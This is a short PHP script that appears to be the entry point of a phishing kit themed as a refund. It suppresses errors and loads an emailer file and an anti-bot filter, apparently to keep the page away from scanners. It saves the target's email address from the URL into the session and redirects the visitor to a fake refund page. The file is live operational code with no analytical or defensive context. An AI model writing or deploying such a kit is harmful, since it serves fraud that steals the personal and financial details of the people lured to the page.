<?php
session_start();
error_reporting(0);
include "refund/includes/my_email.php";
include 'refund/anti.php';
include "One_Time.php";
$_SESSION['access'] = "access";
$_SESSION['g'] = $_GET['ea'];
header("Location: refund/index?code=2");
?>